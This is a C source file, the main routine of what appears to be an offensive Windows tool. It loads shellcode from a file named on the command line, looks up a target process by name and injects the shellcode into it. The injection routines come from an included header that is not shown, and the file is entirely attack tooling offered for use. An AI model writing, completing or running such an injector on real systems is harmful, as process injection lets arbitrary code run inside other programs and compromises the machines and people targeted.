#pragma once
#include <stdio.h>
#include <Windows.h>
#include "injection.h"

//------------------------------------------------------------------------------------------------------

int main(int argc, char* argv[]) {
	if (argc != 3) {
		yapBad("Usage: %s [Process Name] [SHELLCOED.BIN], Error: %ld", argv[0], GetLastError());
		return EXIT_FAILURE;
	}

	if (!LoadShellcodeFromFile(argv[2])) {
		yapBad("Shellcode Injection Failed. Error code: (%ld)", GetLastError());
		return EXIT_FAILURE;
	}

	banner();
	Sleep(3000);

	DWORD PID = findPID(argv[1]);
	if (PID == NULL) {
		yapBad("Shellcode Injection Failed. Error code: (%ld)", GetLastError());
		return EXIT_FAILURE;
	}

	Sleep(1000);

	if (!ShellcodeInjection(PID, shellcode, sizeof(shellcode))) {
		yapBad("Shellcode Injection Failed. Error code: (%ld)", GetLastError());
		return EXIT_FAILURE;
	}

	yapOkay("Shellcode injection sucessfull");

	return EXIT_SUCCESS; // EXIT_SUCCESS just returns 0, I just like to make things looks complicated ;)
}
